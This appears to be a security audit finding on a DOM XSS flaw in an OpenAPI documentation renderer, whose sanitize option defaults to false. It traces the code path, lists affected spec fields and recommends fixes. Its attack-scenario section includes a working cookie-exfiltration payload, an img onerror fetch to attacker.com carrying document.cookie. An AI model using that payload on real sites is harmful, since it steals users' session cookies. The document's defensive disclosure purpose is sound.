---
ID: H-00-A
Verdict: VALID
Severity-Original: HIGH
Class: XSS
File: src/services/AcmeNormalizedOptions.ts:317
Source: spec.*.description (and 12+ Markdown-bearing fields incl. info.description, info.summary, operation/parameter/response/schema description, OAuth scope description per H-00-D, security scheme description, server description, callback description, media-type example description, enum value descriptions)
Sink: [REDACTED].tsx:31 (dangerouslySetInnerHTML, ungated when options.sanitize=false)
Chamber: chamber-01
Triage-Priority: skip
Triage-Exploitability: moderate
Triage-Impact: high
Triage-Reasoning: sanitize=false default enables DOM XSS via attacker-controlled spec content; cookie exfiltration on page load with concrete PoC payload
Triage-Model: claude-sonnet-4-6
Triaged-At: 2026-05-19T00:00:00Z
Pre-FP-Flag: documented as an insecure-but-opt-in default in docs/config.md:77-80 ("If set to true, the API definition is considered untrusted and all HTML/Markdown is sanitized to prevent XSS") and docs/config.md:212-214 for the legacy untrustedSpec alias; CHANGELOG.md:1965 records the option as the documented XSS mitigation. Re-frame as "secure-default gap / documentation-prominence failure" rather than unknown bug; downgraded CRITICAL → HIGH on Advocate review. H-00-D (OAuth scope / security-scheme Markdown XSS, MEDIUM) is collapsed into this finding as an affected-fields sub-item.
Intent-Verdict: intentional-design
Intent-Source: docs/config.md:77-80
Intent-Quote: "sanitize — If set to true, the API definition is considered untrusted and all HTML/Markdown is sanitized to prevent XSS."
Intent-Confidence: strong
Context-Reviewer-Reasoning: context-reviewer: docs/config.md:77-80 documents sanitize as an opt-in operator gate; CHANGELOG.md:1965 records untrusted-spec as the named XSS mitigation. (prior Triage-Priority: P1)
Debate: archon/chamber-workspace/chamber-01/debate.md
---

# p5-003 — DOMPurify disabled by default: raw HTML from spec into dangerouslySetInnerHTML

**Severity**: High (design-level; impact depends on deployment)
**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
**CVSS estimate**: 8.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) — no sanitize required
**DFD Slice**: spec-markdown-to-dangerouslySetInnerHTML (sanitize=false default path)
**Phase**: D5 — Code Scan

## Finding Summary

`options.sanitize` defaults to `false`. When this default is active (i.e., the embedding app does
not explicitly set `sanitize: true` or `untrustedSpec: true`), the Markdown-rendering pipeline
passes raw HTML from spec `description` fields directly to `dangerouslySetInnerHTML` with no
sanitization whatsoever.

Any OpenAPI spec rendered with default settings is a direct DOM XSS vector if the spec content
includes inline HTML, `<script>` tags, or event handler attributes.

## Code Path

```
spec.*.description (attacker-controlled Markdown/HTML)
  → MarkdownRenderer.ts:renderMd() → marked()  [Markdown→HTML, allows raw HTML by default]
  → SanitizedMdBlock.tsx:16: sanitize(options.sanitize, html)
      → options.sanitize === false → returns raw html unchanged
  → SanitizedMdBlock.tsx:30: dangerouslySetInnerHTML={{ __html: html }}
  → DOM (XSS)
```

## Affected Spec Fields

All fields rendered through `MarkdownRenderer`:
- `info.description`
- `info.contact.x-description` (via extensions)
- `tags[].description`
- `paths.*.description`, `paths.*.*.description`
- `paths.*.*.parameters[].description`
- `paths.*.*.requestBody.description`
- `paths.*.*.responses.*.description`
- `components.schemas.*.description`
- Any `x-*` extension field rendered as Markdown

## Attack Scenario

```json
{
  "openapi": "3.0.0",
  "info": {
    "title": "API",
    "version": "1.0",
    "description": "<img src=x onerror='fetch(\"https://attacker.com/\"+document.cookie)'>"
  },
  "paths": {}
}
```

When Acme renders this spec without `sanitize: true`, the `onerror` handler fires immediately
on page load, exfiltrating the user's cookies from the embedding origin.

## Why This is a Finding

This is a documented design decision ("sanitize is opt-in for untrusted specs") but it represents
a security hazard at the deployment level. The threat model in this KB identifies:
- T1 (Critical priority): Spec author injects HTML in description → embedder forgot sanitize → XSS
- T8 (High priority): Reflected-HTML attacker sets `sanitize=false` spec-url attribute

The finding is filed because:
1. The default produces exploitable XSS with zero configuration effort from the attacker.
2. The `sanitize` option name does not communicate "default is dangerous" clearly.
3. No Content Security Policy is injected by Acme to mitigate this fallback.

## Reachability

- `call-graph-slices.json` slice `spec-markdown-to-dangerouslySetInnerHTML` (Path 1): `reachable: true`
- No opt-in required from attacker; requires only that embedder uses default config

## Semgrep / CodeQL Coverage

- Semgrep `react-dangerouslysetinnerhtml` rule flagged `SanitizedMdBlock.tsx:31` (auto-config baseline)
- `[REDACTED].tsx` is the exact sink

## Remediation

Consider changing the default of `options.sanitize` to `true`. If backward compatibility prevents
this, provide a prominent documentation warning and consider a console.warn when untrusted spec
content is detected rendered with `sanitize: false`. A CSP `script-src` policy in the embedding
application is the strongest compensating control.
